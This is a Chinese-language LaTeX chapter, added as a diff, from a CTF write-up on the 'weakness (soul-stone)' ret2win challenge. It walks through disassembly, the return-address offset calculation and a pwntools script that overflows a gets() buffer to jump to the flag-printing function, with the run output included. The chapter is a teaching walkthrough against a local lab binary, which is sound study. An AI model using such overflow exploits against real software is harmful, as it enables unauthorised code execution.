@@ -1,0 +1,157 @@
+\section{第二題：weakness（soul-stone）}
+\label{chap:weakness}
+
+這一題技術上和第一題一模一樣——還是 ret2win。我把它獨立成一章，是因為它會教你
+\textbf{一個很重要的檢查習慣}：不要相信「buffer 看起來多大」，要去組語裡看 \code{lea} 的偏移量。
+
+\subsection{先看防禦機制}
+
+\begin{lstlisting}[style=raw]
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+\end{lstlisting}
+
+和 ret2win 完全相同：\textbf{沒有 canary、沒有 PIE}。
+看到這個組合，你的第一反應應該就是「找 overflow、找目標函式」。
+
+\subsection{程式結構}
+
+\begin{lstlisting}[style=asm]
+0000000000401297 <main>:
+  4012b8:  call   4010c0 <setvbuf@plt>     ; 關掉緩衝，方便互動
+  4012d6:  call   4010c0 <setvbuf@plt>
+  4012f4:  call   4010c0 <setvbuf@plt>
+  4012f9:  call   4011ee <vault>           ; 唯一的重點
+\end{lstlisting}
+
+\code{main} 設完緩衝就呼叫 \code{vault}。而 \code{vault} 裡有兩個關鍵：
+
+\begin{lstlisting}[style=asm]
+00000000004011ee <vault>:
+  4011ee:  endbr64
+  4011f2:  push   rbp
+  4011f3:  mov    rbp,rsp
+  4011f6:  sub    rsp,0x20                    ; <=== 配置了 0x20 bytes 的區域變數
+  4011fa:  ...  puts("===============");
+  401209:  ...  puts("     SOUL STONE VAULT");
+  401218:  ...  puts("===============");
+  401227:  ...  printf("Enter your name: ");
+  40124a:  lea    rax,[rbp-0x20]               ; <=== buffer 起點
+  40124e:  mov    rdi,rax
+  401256:  call   4010a0 <gets@plt>           ; <=== 不限長度
+  40125b:  lea    rax,[rbp-0x20]
+  401271:  call   401090 <printf@plt>         ; printf("Hello, %s!", buf)
+  401276:  ...  puts("The Soul Stone remains sealed...");
+  401295:  leave
+  401296:  ret
+\end{lstlisting}
+
+\begin{keybox}[offset 的算法完全一樣]
+\code{buffer $= 0x20$}，所以
+
+\[
+\text{offset} = 0x20 + 8 = 0x28 = 40
+\]
+
+填 \code{b'A' * 0x28} 之後，接下來 8 bytes 就是 return address。
+\end{keybox}
+
+\subsection{目標：\texttt{soul\_stone()}}
+
+\begin{lstlisting}[style=asm]
+00000000004011b6 <soul_stone>:
+  4011b6:  endbr64
+  4011ba:  push   rbp
+  4011bb:  mov    rbp,rsp
+  4011be:  lea    rax,[rip+0xe43]   # 402009
+  4011c5:  mov    rdi,rax
+  4011c8:  call   401080 <puts@plt>          ; puts("[+] Soul Stone unlocked!")
+  4011cd:  lea    rax,[rip+0xe54]   # 402028
+  4011d4:  mov    rdi,rax
+  4011d7:  call   401080 <puts@plt>          ; puts("OWASP{S0ul_St0ne_...}")
+  4011ec:  pop    rbp
+  4011ed:  ret
+\end{lstlisting}
+
+注意 \code{0x402028} 這個位址——它就是 flag 本身：
+
+\begin{lstlisting}[style=raw]
+$ strings -a -t x soul | grep -i owasp
+    2028 OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
+\end{lstlisting}
+
+\begin{whybox}[這題的 flag 是「印出來的」，不是「讀檔案」]
+ret2win 的 \code{win()} 是 \code{fopen("flag.txt")} 把檔案內容讀進來印；
+weakness 的 \code{soul_stone()} 則是直接把一個字串常數 \code{puts} 出去，
+那個常數就編在 \code{.rodata} 裡。
+
+所以：
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item 這題\textbf{不需要} flag.txt，\code{cwd} 不重要。
+  \item 但這也意味著你能直接用 \code{strings} 把 flag 看出來——
+        \textbf{這是題目設計上的小漏洞}，正式比賽不該這樣。當成一個提醒就好。
+\end{itemize}
+\end{whybox}
+
+\subsection{腳本}
+
+\begin{lstlisting}[style=py]
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+BIN = '/home/kzzz/Documents/code/ctf/ctf7/pwn/work/weakness/soul'
+elf = ELF(BIN, checksec=False)
+
+SOUL_STONE = elf.symbols['soul_stone']      # 0x4011b6
+RET        = 0x40101a                       # 對齊用（同上一章）
+
+OFFSET = 0x20 + 8                           # buf[0x20] + saved rbp
+
+payload  = b'A' * OFFSET
+payload += p64(RET)
+payload += p64(SOUL_STONE)
+
+io = process(BIN, cwd=os.path.dirname(BIN))
+io.sendlineafter(b'Enter your name: ', payload)
+print(io.recvall(timeout=2).decode(errors='replace'))
+\end{lstlisting}
+
+\subsection{執行結果}
+
+\begin{lstlisting}[style=raw]
+Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@!
+The Soul Stone remains sealed...
+
+[+] Soul Stone unlocked!
+OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
+[*] Process stopped with exit code -11 (SIGSEGV)
+\end{lstlisting}
+
+\begin{warnbox}[拿到 flag 之後 SIGSEGV 是正常的]
+\code{soul_stone()} 執行完 \code{ret} 時，stack 上接下來那格是我們亂填的資料，
+所以它一跳就爆。\textbf{flag 已經印出來了，不影響得分。}
+反過來說，這也是判斷「你打對了」的一個線索：\emph{有印出目標訊息 + 隨後 SIGSEGV}
+通常代表「chain 頭對、尾巴沒收乾淨」。
+\end{warnbox}
+
+\subsection{這題多學到的一件事：offset 要用組語驗證}
+
+很多人在這一步會猜錯。假設你只看到 \code{sub rsp,0x20}，你可能會想「那 buffer 是 0x20」；
+但 \code{sub rsp,0x20} 指的是\textbf{整個 frame} 少 0x20，不一定等於 buffer 大小。
+真正的答案永遠在 \code{gets} 前面那一行：
+
+\begin{lstlisting}[style=asm]
+lea    rax,[rbp-0x20]     ; <== 這個 -0x20 才是 buffer 起點
+mov    rdi,rax
+call   gets@plt
+\end{lstlisting}
+
+\begin{keybox}[養成反射動作]
+看到 \code{gets} / \code{read} / \code{scanf("\%s")}，就往回找它的第一個參數是
+\code{rbp-0x??} 還是 \code{rsp+0x??}，\textbf{那個數字才是 buffer 大小}。
+\end{keybox}
